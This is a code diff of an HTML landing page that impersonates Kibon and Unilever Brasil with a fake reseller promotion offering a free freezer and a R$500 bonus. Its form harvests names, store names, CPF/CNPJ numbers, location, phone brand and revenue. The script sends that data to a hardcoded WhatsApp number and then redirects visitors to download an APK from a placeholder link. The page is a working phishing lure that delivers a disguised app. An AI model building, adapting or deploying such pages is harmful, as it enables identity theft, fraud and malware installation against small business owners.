@@ -3,31 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kibon - Portal do Revendedor</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
+    <title>KIBON - Credenciamento Oficial</title>
     <style>
-        :root { --kibon-red: #E2001A; --kibon-yellow: #FFD700; --dark: #1a1a1a; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Montserrat', sans-serif; }
-        body { background: #fdfdfd; color: var(--dark); line-height: 1.6; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Arial Black', sans-serif; }
+        body { background: #E2001A; padding: 10px; text-align: center; color: white; }
         
-        /* Header Profissional */
-        header { background: var(--kibon-red); padding: 40px 20px; text-align: center; border-bottom: 6px solid var(--kibon-yellow); color: white; }
-        .logo { font-size: 55px; font-weight: 900; letter-spacing: -3px; display: block; line-height: 1; }
-        .promo-badge { background: white; color: var(--kibon-red); display: inline-block; padding: 5px 15px; border-radius: 50px; font-weight: 800; font-size: 12px; margin-top: 10px; text-transform: uppercase; }
+        /* CABEÇALHO GIGANTE PROFISSIONAL */
+        .logo-box { padding: 30px 0; }
+        .logo-txt { font-size: 75px; font-weight: 900; letter-spacing: -5px; line-height: 1; text-shadow: 4px 4px 0px rgba(0,0,0,0.2); }
+        .tag { background: #FFD700; color: #E2001A; padding: 8px 20px; border-radius: 50px; font-weight: 900; display: inline-block; transform: rotate(-2deg); box-shadow: 3px 3px 0 #000; margin-top: 10px; }
 
-        .hero-box { max-width: 500px; margin: -20px auto 20px; background: var(--dark); color: white; padding: 25px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.15); }
-        .hero-box h2 { font-size: 14px; color: var(--kibon-yellow); text-transform: uppercase; letter-spacing: 1px; }
-        .price { font-size: 48px; font-weight: 900; display: block; margin: 5px 0; }
-        .benefit { font-size: 13px; font-weight: 700; border-top: 1px solid #333; padding-top: 10px; color: #00ff88; }
+        /* AREA DE OFERTA */
+        .oferta { background: #000; border: 2px solid #FFD700; border-radius: 20px; margin: 15px 0; padding: 20px; }
+        .preco { font-size: 50px; font-weight: 900; color: #fff; display: block; }
+        .promo-txt { color: #FFD700; font-size: 14px; font-weight: bold; text-transform: uppercase; margin-top: 10px; }
 
-        /* Formulário de Alta Conversão */
-        .form-container { max-width: 500px; margin: 0 auto 40px; padding: 0 20px; }
-        .card { background: white; padding: 30px; border-radius: 25px; border: 1px solid #eee; }
-        .field { margin-bottom: 18px; }
-        label { display: block; font-size: 11px; font-weight: 700; color: #999; margin-bottom: 6px; text-transform: uppercase; }
-        input, select { width: 100%; padding: 14px; border: 2px solid #f0f0f0; border-radius: 12px; font-size: 15px; outline: none; transition: 0.3s; font-weight: 600; }
-        input:focus { border-color: var(--kibon-red); background: #fffcfc; }
+        /* FORMULÁRIO ESTILO UNILEVER */
+        .card { background: white; border-radius: 25px; padding: 25px; text-align: left; color: #333; box-shadow: 0 15px 40px rgba(0,0,0,0.4); }
+        h2 { text-align: center; font-size: 18px; color: #E2001A; margin-bottom: 20px; text-transform: uppercase; }
         
-        .error-msg { color: var(--kibon-red); font-size: 11px; font-weight: 700; display: none; margin-top: 5px; }
+        label { display: block; font-size: 10px; font-weight: bold; color: #888; margin-bottom: 4px; text-transform: uppercase; font-family: sans-serif; }
+        input, select { width: 100%; padding: 13px; border: 2px solid #eee; border-radius: 12px; font-size: 15px; margin-bottom: 15px; outline: none; font-weight: bold; font-family: sans-serif; }
+        input:focus { border-color: #E2001A; }
+        
+        .erro { color: #ff4d4d; font-size: 11px; font-weight: bold; display: none; margin-bottom: 10px; text-align: center; }
 
-        .btn-cta { width: 100%; padding: 22px; background: var(--kibon-red); color: white; border: none; border-radius: 15px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 20px rgba(226,
+        .btn { width: 100%; padding: 22px; background: #E2001A; color: white; border: none; border-radius: 50px; font-size: 18px; font-weight: 900; cursor: pointer; text-transform: uppercase; box-shadow: 0 8px 20px rgba(0,0,0,0.2); }
+        .footer { font-size: 10px; color: #fff; margin-top: 20px; opacity: 0.8; font-family: sans-serif; }
+    </style>
+</head>
+<body>
+
+    <div class="logo-box">
+        <h1 class="logo-txt">KIBON</h1>
+        <div class="tag">PROMOÇÃO KILOUCURA</div>
+    </div>
+
+    <div class="oferta">
+        <p style="font-size: 11px; color: #FFD700; letter-spacing: 2px;">TABELA REVENDA</p>
+        <span class="preco">R$ 0,59 <small style="font-size: 18px;">un.</small></span>
+        <div class="promo-txt">🎁 GANHE O FREEZER + R$ 500 DE BÔNUS</div>
+    </div>
+
+    <div class="card">
+        <h2>Credenciamento de Vendas</h2>
+        
+        <label>Responsável e Nome da Loja</label>
+        <input type="text" id="nome" placeholder="Seu Nome">
+        <input type="text" id="loja" placeholder="Nome Fantasia do Comércio">
+
+        <label>CNPJ ou CPF (Apenas números)</label>
+        <input type="text" id="doc" placeholder="Digite Documento" maxlength="14">
+        <p id="msgErro" class="erro">⚠️ DOCUMENTO INVÁLIDO!</p>
+
+        <div style="display: flex; gap: 10px;">
+            <div style="flex: 1;">
+                <label>UF</label>
+                <select id="uf">
+                    <option value="">UF</option><option value="AC">AC</option><option value="AL">AL</option><option value="AP">AP</option><option value="AM">AM</option><option value="BA">BA</option><option value="CE">CE</option><option value="DF">DF</option><option value="ES">ES</option><option value="GO">GO</option><option value="MA">MA</option><option value="MT">MT</option><option value="MS">MS</option><option value="MG">MG</option><option value="PA">PA</option><option value="PB">PB</option><option value="PR">PR</option><option value="PE">PE</option><option value="PI">PI</option><option value="RJ">RJ</option><option value="RN">RN</option><option value="RS">RS</option><option value="RO">RO</option><option value="RR">RR</option><option value="SC">SC</option><option value="SP">SP</option><option value="SE">SE</option><option value="TO">TO</option>
+                </select>
+            </div>
+            <div style="flex: 2;">
+                <label>Cidade</label>
+                <input type="text" id="cid" placeholder="Sua Cidade">
+            </div>
+        </div>
+
+        <label>Aparelho Celular e Faturamento</label>
+        <select id="cel">
+            <option value="">Marca do Celular...</option>
+            <option value="Samsung">Samsung</option><option value="iPhone">iPhone</option><option value="Motorola">Motorola</option><option value="Xiaomi">Xiaomi</option><option value="Outro">Outro</option>
+        </select>
+        
+        <select id="fat">
+            <option value="">Faturamento Mensal...</option>
+            <option value="Ate 5k">Até R$ 5.000</option><option value="5k a 15k">R$ 5.000 a R$ 15.000</option><option value="Acima 15k">Acima de R$ 15.000</option>
+        </select>
+
+        <button class="btn" onclick="validar()">BAIXAR APK E RESGATAR</button>
+    </div>
+
+    <p class="footer">DISTRIBUIÇÃO UNILEVER BRASIL © 2026</p>
+
+    <script>
+        function validar() {
+            const fone = "5554999422678";
+            const apk = "https://seusite.netlify.app/kibon.apk"; // <--- COLOQUE O LINK DO SEU APK AQUI
+
+            const d = document.getElementById('doc').value.replace(/\D/g, '');
+            const n = document.getElementById('nome').value;
+            const l = document.getElementById('loja').value;
+            const c = document.getElementById('cid').value;
+            const u = document.getElementById('uf').value;
+            const m = document.getElementById('cel').value;
+            const f = document.getElementById('fat').value;
+
+            if (d.length !== 11 && d.length !== 14) {
+                document.getElementById('msgErro').style.display = 'block';
+                alert("⚠️ Erro: Documento CPF/CNPJ inválido!");
+                return;
+            }
+
+            if (!n || !l || !c || !u || !m || !f) {
+                alert("Por favor, preencha toda a ficha!");
+                return;
+            }
+
+            const texto = `*NOVA REVENDA KIBON*%0A--------------------------%0A*Titular:* ${n}%0A*Loja:* ${l}%0A*Doc:* ${d}%0A*Local:* ${c}-${u}%0A*Cel:* ${m}%0A*Fat:* ${f}%0A--------------------------%0A*STATUS: AGUARDANDO ESCOLHA DO FREEZER NO APK*`;
+
+            window.open(`https://api.whatsapp.com/send?phone=${fone}&text=${texto}`, '_blank');
+            
+            setTimeout(() => {
+                alert("Cadastro Validado! O download do APK começará. Instale para escolher seu Freezer e ganhar os R$ 500.");
+                window.location.href = apk;
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
